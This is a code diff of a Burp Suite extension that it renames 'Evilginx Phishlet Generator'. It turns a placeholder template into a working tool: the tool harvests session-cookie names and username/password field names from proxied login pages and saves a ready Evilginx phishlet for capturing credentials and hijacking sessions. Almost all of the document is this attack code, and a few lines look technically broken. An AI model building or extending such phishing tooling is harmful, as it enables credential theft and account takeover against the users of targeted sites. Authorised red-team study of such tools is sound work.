@@ -1,96 +1,96 @@
 from burp import IBurpExtender, IContextMenuFactory, IHttpListener
 import yaml
+import re
+import os
 
 class BurpExtender(IBurpExtender, IContextMenuFactory, IHttpListener):
     def registerExtenderCallbacks(self, callbacks):
-        # Set the extension name
-        callbacks.setExtensionName("Dynamic Phishlet Generator")
-
-        # Register the context menu factory
+        self.callbacks = callbacks
+        self.helpers = callbacks.getHelpers()
+        callbacks.setExtensionName("Evilginx Phishlet Generator")
         callbacks.registerContextMenuFactory(self)
-
-        # Register the HTTP listener
         callbacks.registerHttpListener(self)
-
-        # Initialize a variable to store the last visited domain
         self.last_domain = None
+        self.auth_tokens = []
+        self.form_fields = {}
+        
+        # Configure phishlet save path
+        self.phishlet_path = os.path.expanduser("~/evilginx/phishlets/")
+        if not os.path.exists(self.phishlet_path):
+            os.makedirs(self.phishlet_path)
 
     def createMenuItems(self, invocation):
-        # Create menu item to generate phishlet based on last visited domain
-        menu = [
-            javax.swing.JMenuItem("Generate Phishlet for Last Domain", actionPerformed=lambda e: self.generatePhishlet())
+        return [
+            javax.swing.JMenuItem("Generate & Save Evilginx Phishlet", 
+                actionPerformed=lambda e: self.generatePhishlet())
         ]
-        return menu
+
+    def processHttpMessage(self, toolFlag, messageInfo):
+        if messageInfo.getResponse():
+            response = messageInfo.getResponse()
+            analyzedResponse = self.helpers.analyzeResponse(response)
+            
+            headers = analyzedResponse.getHeaders()
+            for header in headers:
+                if header.lower().startswith("set-cookie:"):
+                    cookie_name = re.search("set-cookie:\\s*([^=]+)=", header.lower())
+                    if cookie_name and cookie_name.group(1) not in self.auth_tokens:
+                        self.auth_tokens.append(cookie_name.group(1))
+
+            body = response[analyzedResponse.getBodyOffset():].tostring()
+            input_fields = re.findall('<input[^>]+name=["\']([^"\']+)["\']', body)
+            for field in input_fields:
+                if "pass" in field.lower():
+                    self.form_fields["password"] = field
+                elif "user" in field.lower() or "email" in field.lower():
+                    self.form_fields["username"] = field
+
+        self.last_domain = messageInfo.getHttpService().getHost()
 
     def generatePhishlet(self):
         if not self.last_domain:
-            print("No domain information available.")
+            print("Error: No domain captured")
             return
 
-        # Example phishlet data based on the last visited domain
         phishlet_data = {
             "min_ver": "3.0.0",
-            "proxy_hosts": [
-                {
-                    "phish_sub": self.last_domain,
-                    "orig_sub": self.last_domain,
-                    "domain": self.last_domain,
-                    "session": True,
-                    "is_landing": True,
-                    "auto_filter": True
-                }
-            ],
-            "sub_filters": [
-                {
-                    "triggers_on": self.last_domain,
-                    "orig_sub": self.last_domain,
-                    "domain": self.last_domain,
-                    "search": "something_to_look_for",
-                    "replace": "replace_it_with_this",
-                    "mimes": ["text/html"]
-                }
-            ],
-            "auth_tokens": [
-                {
-                    "domain": "." + self.last_domain,
-                    "keys": ["cookie_name"]
-                }
-            ],
+            "proxy_hosts": [{
+                "phish_sub": "",
+                "orig_sub": "",
+                "domain": self.last_domain,
+                "session": True,
+                "is_landing": True
+            }],
+            "auth_tokens": [{
+                "domain": f".{self.last_domain}",
+                "keys": self.auth_tokens if self.auth_tokens else ["session", "token"]
+            }],
             "credentials": {
                 "username": {
-                    "key": "email",
+                    "key": self.form_fields.get("username", "email"),
                     "search": "(.*)",
                     "type": "post"
                 },
                 "password": {
-                    "key": "password",
+                    "key": self.form_fields.get("password", "password"),
                     "search": "(.*)",
                     "type": "post"
                 }
             },
             "login": {
                 "domain": self.last_domain,
-                "path": "/evilginx-mastery"
+                "path": "/login"
             }
         }
 
-        # Convert the phishlet data to YAML format
-        phishlet_yaml = self.to_yaml(phishlet_data)
-        
-        # Save or use the phishlet YAML data
-        # For demonstration, print it to the Burp Suite output
-        print(phishlet_yaml)
-
-    def to_yaml(self, data):
         try:
-            import yaml
-        except ImportError:
-            raise RuntimeError("PyYAML is required but not installed.")
-        
-        return yaml.dump(data, default_flow_style=False)
-
-    def processHttpMessage(self, toolFlag, messageInfo):
-        # Get the domain of the request
-        host = messageInfo.getHttpService().getHost()
-        self.last_domain = host
-        print("Visited Domain: " + host)
+            # Save phishlet to evilginx phishlets directory
+            filename = f"{self.last_domain}.yaml"
+            filepath = os.path.join(self.phishlet_path, filename)
+            
+            with open(filepath, 'w') as f:
+                yaml.dump(phishlet_data, f, default_flow_style=False)
+            print(f"Phishlet saved to: {filepath}")
+            
+        except Exception as e:
+            print(f"Error saving phishlet: {str(e)}")
